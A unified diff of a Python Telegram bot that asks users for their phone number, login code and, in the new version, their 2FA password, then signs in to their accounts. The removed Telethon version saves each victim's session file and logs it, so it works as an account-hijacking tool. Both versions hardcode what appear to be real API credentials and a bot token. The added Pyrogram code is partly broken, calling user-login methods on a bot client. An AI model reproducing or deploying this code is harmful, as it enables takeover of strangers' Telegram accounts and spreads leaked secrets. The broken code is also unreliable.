@@ -1,82 +1,52 @@
-import os
-from telegram.ext import ApplicationBuilder, MessageHandler, filters
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
-
 
 
 # Your API credentials from https://my.telegram.org
+
+
+# Temporary state storage
+from pyrogram import Client, errors
+from pyrogram.types import Message
+
+# Set up your API_ID, API_HASH, and bot token
 API_ID = 28863669  # <-- Replace with your API ID (integer)
 API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)
 
 # Your Bot Token from BotFather
 BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"
+app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-# Temporary state storage
-user_states = {}
+@app.on_message()
+async def handle_message(client, message: Message):
+    if message.text.lower() == "/start":
+        await message.reply("Hello! Please enter your phone number to begin.")
 
-# Make sure sessions folder exists
-os.makedirs("sessions", exist_ok=True)
-
-# Handle incoming messages
-async def message_handler(update, context):
-    user_id = update.message.from_user.id
-    text = update.message.text.strip()
-
-    if user_id not in user_states:
-        # First step: user sends phone number
-        user_states[user_id] = {
-            'phone': text,
-            'step': 'waiting_for_otp'
-        }
-        
-        # Create Telethon client for user
-        client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
-        await client.connect()
-        user_states[user_id]['client'] = client
+        # After user enters phone number
+        phone_number = await client.ask(message.chat.id, "Enter your phone number:")
 
         try:
-            await client.send_code_request(text)
-            await update.message.reply_text("📩 OTP has been sent to your Telegram. Please enter the OTP code:")
-        except Exception as e:
-            await update.message.reply_text(f"❌ Error sending OTP: {e}")
-            await client.disconnect()
-            del user_states[user_id]
+            # Start the login process
+            await client.send_code_request(phone_number.text)
+            await message.reply("A verification code has been sent to your phone.")
 
-    elif user_states[user_id]['step'] == 'waiting_for_otp':
-        # Second step: user sends OTP
-        client = user_states[user_id]['client']
-        phone = user_states[user_id]['phone']
-        otp = text
+            # Ask for 2FA code if needed
+            verification_code = await client.ask(message.chat.id, "Enter the verification code:")
 
-        try:
-            await client.sign_in(phone=phone, code=otp)
+            # If 2FA is enabled, we need to ask for the 2FA code
+            try:
+                await client.sign_in(phone_number.text, verification_code.text)
+                await message.reply("Successfully logged in!")
+            except errors.FloodWait as e:
+                await message.reply(f"Please wait for {e.x} seconds before trying again.")
+            except errors.SessionPasswordNeeded as e:
+                # 2FA is required
+                await message.reply("2FA is enabled on your account. Please enter the 2FA code:")
+                twofa_code = await client.ask(message.chat.id, "Enter your 2FA code:")
 
-            # Save session automatically when logged in
-            await client.disconnect()
-            
-            await update.message.reply_text("✅ Session created successfully!")
-            print(f"[+] Session created for {phone}")
-
-        except SessionPasswordNeededError:
-            await update.message.reply_text("🔒 Your account has 2FA password enabled. Cannot proceed.")
-            await client.disconnect()
+                # Pass the 2FA code to complete the login
+                await client.check_password(twofa_code.text)
+                await message.reply("Successfully logged in with 2FA!")
 
         except Exception as e:
-            await update.message.reply_text(f"❌ Error logging in: {e}")
-            await client.disconnect()
+            await message.reply(f"An error occurred: {str(e)}")
 
-        # Cleanup user state
-        if user_id in user_states:
-            del user_states[user_id]
-
-# Main function
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
-
-    print("🤖 Bot is running...")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+app.run()
